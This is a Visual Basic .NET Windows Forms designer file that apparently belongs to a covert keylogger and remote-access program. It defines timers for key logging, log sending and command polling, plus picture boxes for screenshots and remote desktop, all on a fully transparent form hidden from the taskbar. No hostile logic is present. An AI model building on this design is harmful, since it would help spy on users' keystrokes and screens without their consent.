<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.PictureBoxScreens = New System.Windows.Forms.PictureBox()
        Me.TextBoxKeys = New System.Windows.Forms.TextBox()
        Me.TimerKeyLogger = New System.Windows.Forms.Timer(Me.components)
        Me.TimerSenderLog = New System.Windows.Forms.Timer(Me.components)
        Me.TimerCommand = New System.Windows.Forms.Timer(Me.components)
        Me.PictureBoxRDP = New System.Windows.Forms.PictureBox()
        CType(Me.PictureBoxScreens, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBoxRDP, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'PictureBoxScreens
        '
        Me.PictureBoxScreens.Location = New System.Drawing.Point(216, 12)
        Me.PictureBoxScreens.Name = "PictureBoxScreens"
        Me.PictureBoxScreens.Size = New System.Drawing.Size(223, 152)
        Me.PictureBoxScreens.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBoxScreens.TabIndex = 0
        Me.PictureBoxScreens.TabStop = False
        '
        'TextBoxKeys
        '
        Me.TextBoxKeys.Location = New System.Drawing.Point(12, 12)
        Me.TextBoxKeys.Multiline = True
        Me.TextBoxKeys.Name = "TextBoxKeys"
        Me.TextBoxKeys.Size = New System.Drawing.Size(198, 284)
        Me.TextBoxKeys.TabIndex = 1
        '
        'TimerKeyLogger
        '
        Me.TimerKeyLogger.Interval = 1
        '
        'TimerSenderLog
        '
        Me.TimerSenderLog.Interval = 60000
        '
        'TimerCommand
        '
        Me.TimerCommand.Interval = 5000
        '
        'PictureBoxRDP
        '
        Me.PictureBoxRDP.Location = New System.Drawing.Point(216, 170)
        Me.PictureBoxRDP.Name = "PictureBoxRDP"
        Me.PictureBoxRDP.Size = New System.Drawing.Size(223, 126)
        Me.PictureBoxRDP.TabIndex = 3
        Me.PictureBoxRDP.TabStop = False
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 15.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(451, 308)
        Me.Controls.Add(Me.PictureBoxRDP)
        Me.Controls.Add(Me.TextBoxKeys)
        Me.Controls.Add(Me.PictureBoxScreens)
        Me.name = "Form1"
        Me.Opacity = 0R
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = "Form1"
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        CType(Me.PictureBoxScreens, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBoxRDP, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents PictureBoxScreens As PictureBox
    Friend WithEvents TextBoxKeys As TextBox
    Friend WithEvents TimerKeyLogger As Timer
    Friend WithEvents TimerSenderLog As Timer
    Friend WithEvents TimerCommand As Timer
    Friend WithEvents PictureBoxRDP As PictureBox
End Class
